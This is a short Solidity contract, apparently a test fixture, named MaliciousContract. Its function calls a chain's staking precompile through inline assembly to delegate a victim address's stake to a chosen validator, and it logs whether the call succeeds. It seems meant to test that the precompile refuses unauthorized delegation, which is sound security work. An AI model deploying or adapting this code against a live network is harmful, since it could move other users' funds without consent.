//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import { StakingPrecompilesSelectors, Directive } from "../lib/StakingPrecompiles.sol";

contract MaliciousContract {
  event StakingPrecompileCalled(uint8 directive, bool success);

  function delegate(address victimAddress, address validatorAddress, uint256 amount) public returns (bool success) {
    bytes memory encodedInput = abi.encodeWithSelector(StakingPrecompilesSelectors.Delegate.selector,
                                    victimAddress,
                                    validatorAddress,
                                    amount);
    uint256 result;
    assembly {
      result := call(25000,
        0xfc,
        0x0,
        add(encodedInput, 32),
        mload(encodedInput),
        mload(0x40),
        0x20
      )
    }
    success = result != 0;
    emit StakingPrecompileCalled(uint8(Directive.DELEGATE), success);
  }
}
